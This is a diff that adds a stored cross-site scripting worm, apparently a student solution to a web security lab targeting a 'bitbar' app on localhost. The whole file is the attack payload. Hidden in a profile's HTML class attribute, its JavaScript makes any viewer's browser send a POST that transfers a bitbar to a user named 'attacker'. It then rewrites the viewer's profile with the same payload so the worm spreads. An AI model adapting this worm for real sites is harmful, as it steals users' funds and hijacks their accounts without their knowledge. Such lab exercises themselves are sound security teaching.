@@ -1,0 +1,26 @@
+<p id='bitbar_count' class='
+	var http = new XMLHttpRequest();
+	var url = "http://localhost:3000/post_transfer";
+	var params = "destination_username=attacker&quantity=1";
+	http.open("POST", url, true);
+	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	http.setRequestHeader("Content-length", params.length);
+	http.setRequestHeader("Connection", "close");
+
+	http.onreadystatechange = function() 
+	{
+    	if(http.readyState == 4 && http.status == 200) 
+    	{
+    		var http2 = new XMLHttpRequest();
+			var url2 = "http://localhost:3000/set_profile";
+			var params2 = "new_profile=" + encodeURIComponent("<p id=\"bitbar_count\" class=\'"+ document.getElementById("bitbar_count").className + "\'>Please give me a perfect score!</p>");
+;
+			http2.open("POST", url2, true);
+			http2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			http2.setRequestHeader("Content-length", params2.length);
+			http2.setRequestHeader("Connection", "close");
+			http2.send(params2);
+    	}
+	}
+	http.send(params);
+'>Please give me a perfect score!</p>
